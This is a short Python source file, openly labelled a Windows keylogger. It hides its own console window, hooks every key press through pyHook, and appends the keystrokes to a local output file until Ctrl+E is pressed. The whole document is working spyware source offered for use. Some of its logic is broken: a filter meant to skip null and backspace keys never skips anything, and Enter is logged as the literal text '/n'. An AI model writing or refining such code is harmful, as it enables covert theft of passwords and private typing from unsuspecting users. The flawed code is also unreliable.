# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook
import os

# hiding console
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def OnKeyboardEvent(event):
    # program will exit when CTRL+e is pressed
    if event.Ascii==5: 
        os._exit(1)
    # the pressed key should not be anything null or backspace, only then it will be recorded in the output file
    if event.Ascii !=0 or event.Ascii !=8: 
    #open output.txt to read current keystrokes 
        f = open('F:\output.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # open output.txt to write current + new keystrokes 
        f = open('F:\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
                    keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close()
        return True # dont use return0 or else pyhook wouldnt catch the pressed keys
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages()
hm.UnHookKeyboard()
